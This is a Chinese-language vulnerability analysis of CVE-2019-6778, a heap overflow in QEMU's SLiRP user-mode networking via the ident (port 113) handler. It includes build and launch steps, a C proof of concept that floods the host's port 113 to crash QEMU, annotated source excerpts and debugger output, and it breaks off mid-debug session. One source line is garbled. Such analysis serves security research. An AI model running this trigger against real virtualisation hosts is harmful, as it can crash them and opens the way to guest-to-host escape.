@@ -1,0 +1,185 @@
+**作者：raycp**  
+**原文来自安全客：**
+## 漏洞描述
+`qemu-kvm`默认使用的是`-net nic -net user`的参数，提供了一种用户模式（user-mode）的网络模拟。使用用户模式的网络的客户机可以连通宿主机及外部的网络。用户模式网络是完全由QEMU自身实现的，不依赖于其他的工具（bridge-utils、dnsmasq、iptables等），而且不需要root用户权限。QEMU使用Slirp实现了一整套TCP/IP协议栈，并且使用这个协议栈实现了一套虚拟的NAT网络。SLiRP模块主要模拟了网络应用层协议，其中包括IP协议（v4和v6）、DHCP协议、ARP协议等。
+cve-2019-6778这个漏洞存在于QEMU的网络模块SLiRP中。该模块中的`tcp_emu()`函数对端口113( _Identification
+protocol_ )的数据进行处理时，没有进行有效的数据验证，导致堆溢出。经过构造，可实现以QEMU进程权限执行任意代码。
+## 漏洞复现
+首先是安装环境，根据[官方](https://github.com/Kira-cxy/qemu-vm-escape)描述，漏洞版本是`3.1.50`，但是我在git中没有找到这个版本，于是使用的是`3.1.0`，使用下面的命令编译qemu。
+    git clone git://git.qemu-project.org/qemu.git
+    cd qemu
+    git checkout tags/v3.1.0
+    mkdir -p bin/debug/naive
+    cd bin/debug/naive
+    ../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror
+    make
+编译出来qemu的路径为`./qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64`，查看版本：
+    $ ./qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64 -version
+    QEMU emulator version 3.1.0 (v3.1.0-dirty)
+    Copyright (c) 2003-2018 Fabrice Bellard and the QEMU Project developers
+接下来就是编译内核与文件系统，可以参考上一篇的`cve-2015-5165`漏洞分析的文章。
+因为漏洞需要在user模式下启动虚拟机，因此使用以下的命令启动qemu虚拟机：
+    $ cat launch.sh
+    #!/bin/sh
+    ./qemu-system-x86_64 \
+        -kernel ./bzImage  \
+        -append "console=ttyS0 root=/dev/sda rw"  \
+        -hda ./rootfs.img  \
+        -enable-kvm -m 2G -nographic \
+        -L ./pc-bios -smp 1 \
+        -net user,hostfwd=tcp::2222-:22 -net nic
+漏洞需要在user模式下启动虚拟机，启动虚拟机后虚拟机的ip为`10.0.2.15`，宿主机ip为`10.0.2.2`。虽然在主机中`ifconfig`看不到该ip，但确实是可以连通的。可以从qemu虚拟机中ping主机，无法从主机ping虚拟机。
+poc代码如下，将其编译好并拷贝至虚拟机中：
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    int main() {
+        int s, ret;
+        struct sockaddr_in ip_addr;
+        char buf[0x500];
+        s = socket(AF_INET, SOCK_STREAM, 0);
+        ip_addr.sin_family = AF_INET;
+        ip_addr.sin_addr.s_addr = inet_addr("10.0.2.2"); // host IP
+        ip_addr.sin_port = htons(113);                   // vulnerable port
+        ret = connect(s, (struct sockaddr *)&ip_addr, sizeof(struct sockaddr_in));
+        memset(buf, 'A', 0x500);
+        while (1) {
+            write(s, buf, 0x500);
+        }
+        return 0;
+    }
+然后在宿主机中`sudo nc -lvnp 113`端口，在虚拟机中运行poc，即可看到qemu虚拟机崩溃，成功复现漏洞。
+## 漏洞分析
+根据作者[writeup](https://github.com/Kira-cxy/qemu-vm-escape/blob/master/writeup_zh.md)，将断点下在`tcp_emu`，可以看到调用栈如下：
+     ? f 0     5583e153e5ae tcp_emu+28
+       f 1     5583e153aa5a tcp_input+3189
+       f 2     5583e1531765 ip_input+710
+       f 3     5583e1534cb6 slirp_input+412
+       f 4     5583e151ceea net_slirp_receive+83
+       f 5     5583e15128c4 nc_sendv_compat+254
+       f 6     5583e1512986 qemu_deliver_packet_iov+172
+       f 7     5583e151553f qemu_net_queue_deliver_iov+80
+       f 8     5583e15156ae qemu_net_queue_send_iov+134
+       f 9     5583e1512acb qemu_sendv_packet_async+289
+       f 10     5583e1512af8 qemu_sendv_packet+43
+结合源码调试，该函数在`slirp/tcp_subr.c`中：
+    int
+    tcp_emu(struct socket *so, struct mbuf *m)
+    {
+        ...
+        switch(so->so_emu) {
+            int x, i;
+         case EMU_IDENT:
+            /*
+             * Identification protocol as per rfc-1413
+             */
+            {
+          ...
+                struct sbuf *so_rcv = &so->so_rcv;
+                memcpy(so_rcv->sb_wptr, m->m_data, m->m_len);
+                so_rcv->sb_wptr += m->m_len;
+                so_rcv->sb_rptr += m->m_len;
+                m->m_data[m->m_len] = 0; /* NULL terminate */
+                if (strchr(m->m_data, '\r') || strchr(m->m_data, '\n')) {
+                    if (sscanf(so_rcv->sb_data, "%u%*[ ,]%u", &n1, &n2) == 2) {
+                    ...
+                                    so_rcv->sb_cc = snprintf(so_rcv->sb_data,
+                                                             so_rcv->sb_datalen,
+                                                             "%d,%d\r\n", n1, n2);
+                    so_rcv->sb_rptr = so_rcv->sb_data;
+                    so_rcv->sb_wptr = so_rcv->sb_data + so_rcv->sb_cc;
+                }
+                m_free(m);
+                return 0;
+            }
+可以看到程序会先将`m->data`中的数据拷贝至`so_rcv->sb_wptr`。`m`的定义为`struct
+mbuf`，`so_rcv`的定义为`struct
+sbuf`。`mbuf`是用来保存`ip`传输层的数据，`sbuf`结构体则保存`tcp`网络层的数据，定义如下：
+    struct mbuf {
+        /* XXX should union some of these! */
+        /* header at beginning of each mbuf: */
+        struct  mbuf *m_next;       /* Linked list of mbufs */
+        struct  mbuf *m_prev;
+        struct  mbuf *m_nextpkt;    /* Next packet in queue/record */
+        struct  mbuf *m_prevpkt;    /* Flags aren't used in the output queue */
+        int m_flags;        /* Misc flags */
+        int m_size;         /* Size of mbuf, from m_dat or m_ext */
+        struct  socket *m_so;
+        caddr_t m_data;         /* Current location of data */
+        int m_len;          /* Amount of data in this mbuf, from m_data */
+        Slirp *slirp;
+        bool    resolution_requested;
+        uint64_t expiration_date;
+        char   *m_ext;
+        /* start of dynamic buffer area, must be last element */
+        char    m_dat[];
+    };
+    struct sbuf {
+        uint32_t sb_cc;     /* actual chars in buffer */
+        uint32_t sb_datalen;    /* Length of data  */
+        char    *sb_wptr;   /* write pointer. points to where the next
+                     * bytes should be written in the sbuf */
+        char    *sb_rptr;   /* read pointer. points to where the next
+                     * byte should be read from the sbuf */
+        char    *sb_data;   /* Actual data */
+    };
+结合结构体的分析知道了，程序将`m->data`中的数据拷贝至`so_rcv->sb_wptr`，但是由于字符串中没有`\r`或`\n`，导致没有将`sb_cc`赋值，形成了buffer空间变小，而数值却没有变化的情形。
+查看`tcp_enu`的调用函数`tcp_input`函数，代码在`slirp/tcp_input.c`中：
+    else if (ti->ti_ack == tp->snd_una &&
+                tcpfrag_list_empty(tp) &&
+                ti->ti_len so_rcv)) {
+                ...
+                /*
+                 * Add data to socket buffer.
+                 */
+                if (so->so_emu) {
+                    if (tcp_emu(so,m)) sbappend(so, m);
+`ti`为`tcpiphdr`结构体，其定义以及`sbspace`定义如下：
+    struct tcpiphdr {
+        struct mbuf_ptr ih_mbuf;    /* backpointer to mbuf */
+        union {
+            struct {
+                struct  in_addr ih_src; /* source internet address */
+                struct  in_addr ih_dst; /* destination internet address */
+                uint8_t ih_x1;          /* (unused) */
+                uint8_t ih_pr;          /* protocol */
+            } ti_i4;
+            struct {
+                struct  in6_addr ih_src;
+                struct  in6_addr ih_dst;
+                uint8_t ih_x1;
+                uint8_t ih_nh;
+            } ti_i6;
+        } ti;
+        uint16_t    ti_x0;
+        uint16_t    ti_len;             /* protocol length */
+        struct      tcphdr ti_t;        /* tcp header */
+    };
+    #define sbspace(sb) ((sb)->sb_datalen - (sb)->sb_cc)
+可以看到当为`EMU_IDENT`协议时，会不停的往`so_rcv->sb_wptr`中拷贝数据，并将指针后移，但是却没有对长度进行增加。当不停的发送该协议数据时，会导致堆溢出。
+下面动态调试进行进一步验证。
+    b /home/raycp/work/qemu_escape/qemu/slirp/tcp_subr.c:638`将断点下在`memcpy(so_rcv->sb_wptr, m->m_data, m->m_len);
+第一次拷贝前`so_rcv`数据以及`m`数据为：
+    pwndbg> print *so_rcv
+    $1 = {
+      sb_cc = 0x0,
+      sb_datalen = 0x2238,
+      sb_wptr = 0x7f46001d4d30 "0\a",
+      sb_rptr = 0x7f46001d4d30 "0\a",
+      sb_data = 0x7f46001d4d30 "0\a"
+    }
+    pwndbg> print *m
+    $2 = {
+      m_next = 0x7f46001a6800,
+      m_prev = 0x55dd677c6c78,
+      m_nextpkt = 0x0,
+      m_prevpkt = 0x0,
+      m_flags = 0x4,
+      m_size = 0x608,
+      m_so = 0x7f46001b1630,
+      m_data = 0x55dd67fd04b4 'A' ...,
+      m_len = 0x500,
